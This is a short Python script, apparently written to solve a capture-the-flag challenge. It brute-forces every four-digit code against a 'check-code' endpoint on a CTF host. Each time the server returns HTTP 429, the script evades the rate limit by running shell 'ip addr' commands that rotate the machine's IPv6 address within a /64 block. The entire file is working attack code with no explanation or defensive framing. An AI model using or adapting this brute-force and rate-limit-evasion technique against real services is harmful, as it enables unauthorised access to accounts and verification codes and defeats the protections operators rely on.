import os
import requests
import requests.packages.urllib3.util.connection as urllib3_cn
import socket
import time


def allowed_gai_family():
    return socket.AF_INET6


urllib3_cn.allowed_gai_family = allowed_gai_family

ipPrefix = '2a0d:8480:2:1b7::';
ipPostfix = 0
ipDev = 'ens3'
curCode = 0
endCode = 9999

while curCode <= endCode:
    code = str(curCode);
    while len(code) < 4:
        code = '0' + code 
    print(code)

    req = 0
    try:
        req = requests.post('https://tctf-oracle.ctf.su/check-code', data = {'code' : code})
    except:
        print("req error")
        continue
    print(req.status_code, req.text)
    
    if req.status_code == 429:
        cmd = 'ip addr del {}{}/64 dev {}'.format(ipPrefix, hex(ipPostfix)[2:], ipDev)
        print(cmd)
        os.system(cmd)
        ipPostfix += 1
        cmd = 'ip addr add {}{}/64 dev {}'.format(ipPrefix, hex(ipPostfix)[2:], ipDev)
        print(cmd)
        os.system(cmd)
        time.sleep(3)
        continue

    if 'Incorrect code' not in req.text:
        print('SUCCESS')
        print(req.text)
        break
    
    curCode += 1

print('FINISH')
